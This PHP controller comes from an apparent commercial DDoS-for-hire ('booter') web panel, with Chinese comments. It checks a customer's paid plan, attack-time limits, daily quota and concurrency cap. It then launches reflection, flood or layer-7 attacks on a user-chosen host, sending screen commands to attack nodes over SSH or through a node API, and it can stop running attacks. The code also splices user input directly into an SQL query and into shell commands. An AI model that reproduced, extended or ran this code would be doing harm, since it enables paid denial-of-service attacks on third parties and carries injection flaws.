<?php
namespace app\index\controller;

use think\Controller;
use think\Request;

class Hub extends Controller
{
	public function index(){
		$user = db('users');
        if(!$userInfo = chickLogin($user))
		{
			$this->error('未登录','User/login');
			exit;
		}
		$config = db('config');
		//取模式列表
		$methodList = [
			'reflect' =>json_decode($config->where('name','reflect')->find()['value'],true),
			'usually' =>json_decode($config->where('name','usually')->find()['value'],true),
			'application' =>json_decode($config->where('name','application')->find()['value'],true)
		];
		if(Request::instance()->isPost())
		{
			$hubInfo = [ //目标信息
				'host'=>input('post.host'),
				'port'=>input('post.port'),
				'time'=>input('post.time'),
				'mode'=>input('post.mode'),
				'vip'=>input('post.vip'),
			];
			
			$result = $this->validate($hubInfo,'Hub.start');
			if(true !== $result)
			{
				$this->error($result);
				exit;
			}
			
			if($userInfo['status']!=1) //账户状态检测
			{
				$this->error('您的账户已被封禁或还没有激活!');
				exit;
			}
			elseif($userInfo['plan']==0){ //套餐购买检测
				$this->error('您没有购买套餐!');
				exit;
			}
			elseif($userInfo['expiration'] < time()) //套餐过期检测
			{
				$this->error('您的套餐已经过期,请购买新的套餐!');
				exit;
			}
			elseif($userInfo['maxtime'] < $hubInfo['time']) //最大时间检测
			{
				$this->error('您设置的攻击时间超过您套餐的最大时间,您最多有'.$userInfo['maxtime'].'秒的时间!');
				exit;
			}
			elseif($userInfo['remainder']==0) //剩余次数是否为0
			{
				$this->error('您当日剩余次数已经用完,请明日再试,或者购买临时次数补充包!');
				exit;
			}
			elseif($userInfo['vip']==0 && !$hubInfo['vip']==0) //检测vip
			{
				$this->error('您必须购买包含vip的套餐包才能使用vip节点!');
				exit;
			}
			elseif(getBooting(db('history'),$userInfo['id'])>=$userInfo['maxboot']) //检测最大并发
			{
				$this->error('您的并发攻击已经达到套餐上限,请停止部分攻击或购买补充包!');
				exit;
			}
			elseif(db('white_list')->where('ip',$hubInfo['host'])->find()) //检测是否存在于白名单
			{
				$this->error('此ip存在于白名单中,您禁止攻击它!');
				exit;
			}
			//判断3/4层下是否为合法ip
			if(in_array($hubInfo['mode'],$methodList['reflect']) || in_array($hubInfo['mode'],$methodList['usually'])){
				if(!filter_var($hubInfo['host'], FILTER_VALIDATE_IP, FILTER_FLAG_IPV4 | FILTER_FLAG_NO_PRIV_RANGE)) {
					$this->error('您输入的不是一个有效的公网ipv4地址!');
					exit;
				}
			}
			//判断7层下是否为合法url
			if(in_array($hubInfo['mode'],$methodList['application'])){
				if(!filter_var($hubInfo['host'], FILTER_VALIDATE_URL)) {
					$this->error('您输入的不是一个有效的url!');
					exit;
				}
			}
			//取可用节点列表
			$server = db('server');
			if(!$serverList = $server->where("vip='{$hubInfo['vip']}' and mode like '%{$hubInfo['mode']}%'")->select())
			{
				$this->error('您所选的节点和攻击类型中没有可用的节点,请尝试更换节点类型.');
				exit;
			}
			else
			{
				$serverInfo =$serverList[array_rand($serverList,1)]; //随机抽取一个节点
				
				//历史记录
				$bootHistory = [
					'ip'=>$hubInfo['host'],
					'mode'=>$hubInfo['mode'],
					'time'=>$hubInfo['time'],
					'start_time'=>time(),
					'uid'=>cookie('uid'),
					'stop'=>0,
					'server_id'=>$serverInfo['id'],
				];
				$bootId = db('history')->insertGetId($bootHistory); //先写入历史记录获得id号
				
				//发起攻击
				if($serverInfo['type'] == 1 && function_exists('ssh2_connect')) //直连类型
				{
					if(!$con = ssh2_connect($serverInfo['host'],$serverInfo['port'])) //无法建立连接时
					{
						$this->error('和节点建立连接超时,请再次尝试,多次尝试无效时请联系管理员解决.');
						exit;
					}
					elseif(!ssh2_auth_password($con, $serverInfo['username'], $serverInfo['passwd'])) //账户验证失败时
					{
						$this->error('无法和节点建立起受信任的连接,请联系管理员,错误:auth-'.$serverInfo['id']);
						exit;
					}
					else //执行命令
					{
						if(in_array($hubInfo['mode'],$methodList['reflect'])) //所有反射类型的命令
						{
							$command = "screen -d -m -S {$bootId} {$serverInfo['tool_dir']}/{$hubInfo['mode']} {$hubInfo['host']} {$hubInfo['port']} {$serverInfo['tool_dir']}/{$hubInfo['mode']}.txt 1 -1 {$hubInfo['time']}";
						}
						elseif(in_array($hubInfo['mode'],$methodList['usually']))  //所有的通常类型的命令
						{
							$command = "screen -d -m -S {$bootId} {$serverInfo['tool_dir']}/{$hubInfo['mode']} {$hubInfo['host']} {$hubInfo['port']} 1 -1 {$hubInfo['time']}";
						}
						elseif(in_array($hubInfo['mode'],$methodList['application']))  //所有7层模式
						{
							$command = "screen -d -m -S {$bootId} {$serverInfo['tool_dir']}/{$hubInfo['mode']} '{$hubInfo['host']}' {$serverInfo['tool_dir']}/{$hubInfo['mode']}.txt {$hubInfo['time']} 600";
						}
						else
						{
							$this->error('未知的攻击格式.');
							exit;
						}
						
						if(!ssh2_exec($con, $command))
						{
							$this->error("执行攻击失败,请再次尝试,多次无效后请联系管理员.");
							exit;
						}
						else
						{
							//执行成功后扣除用户相应次数
							$userInfo['remainder'] = $userInfo['remainder'] - 1;
							unset($userInfo['percent']);
							$user->where('id',$userInfo['id'])->update($userInfo);
							$this->success('成功发起一次攻击,由'.$serverInfo['id'].'号节点执行了此次攻击.');
						}
					}
				}
				elseif($serverInfo['type=2']) //api类型
				{
					//请求数据
					$requestData = [
						'key'=>$serverInfo['passwd'],
						'host'=>$hubInfo['host'],
						'port'=>$hubInfo['port'],
						'time'=>$hubInfo['time'],
						'method'=>$hubInfo['mode'],
					];
					if(getRequest($serverInfo['host'],$requestData))
					{
						//执行成功后扣除用户相应次数
						$userInfo['remainder'] = $userInfo['remainder'] - 1;
						unset($userInfo['percent']);
						$user->where('id',$userInfo['id'])->update($userInfo);
						$this->success('成功发起一次攻击,由'.$serverInfo['id'].'号节点执行了此次攻击.');
					}
					else
					{
						$this->error('和节点建立通信时发生了一个类型为-1的错误,请联系管理员解决!');
						exit;
					}
				}
				else
				{
					$this->error('无法和节点建立通信,请联系管理员解决.');
					exit;
				}
				
				//执行成功后扣除用户相应次数(此处不会被执行)
				/*
				$userInfo['remainder'] = $userInfo['remainder'] - 1;
				unset($userInfo['percent']);
				$user->where('id',$userInfo['id'])->update($userInfo);
				*/
			}
		}
		else
		{
		
			$this->assign('historyList',bootHistory(db('history'),8)); //历史表
			$this->assign('userInfo',$userInfo);
			$this->assign('methodList',$methodList);
			return $this->fetch();
		}
	}
	
	public function stop(){
		$user = db('users');
        if(!$userInfo = chickLogin($user))
		{
			$this->error('未登录','User/login');
			exit;
		}
		$history = db('history');
		if(!$bootInfo = $history->where('id',input('param.id'))->find()){
			$this->error('没有找到攻击信息!');
			exit;
		}
		
		if($bootInfo['stop'] == 1 || ($bootInfo['start_time'] + $bootInfo['time']) < time()){
			$this->error('此攻击任务已停止或已结束!');
			exit;
		}
		
		if(!$serverInfo = db('server')->where('id',$bootInfo['server_id'])->find()){
			$this->error('没有找到此节点的信息,这个节点可能已被删除!');
			exit;
		}
		
		//和节点建立连接
		if(!$con = ssh2_connect($serverInfo['host'],$serverInfo['port'])) //无法建立连接时
		{
			$this->error('和节点建立连接超时,请再次尝试,多次尝试无效时请联系管理员解决.');
			exit;
		}
		elseif(!ssh2_auth_password($con, $serverInfo['username'], $serverInfo['passwd'])) //账户验证失败时
		{
			$this->error('无法和节点建立起受信任的连接,请联系管理员,错误:auth-'.$serverInfo['id']);
			exit;
		}
		$command = "screen -X -S {$bootInfo['id']} quit";
		if(!ssh2_exec($con, $command))
		{
			$this->error("执行攻击失败,请再次尝试,多次无效后请联系管理员.");
			exit;
		}else{
			$bootInfo['stop'] = 1;
			$history->where('id',$bootInfo['id'])->update($bootInfo);
			$this->success('成功停止攻击任务!');
		}
		
	}
}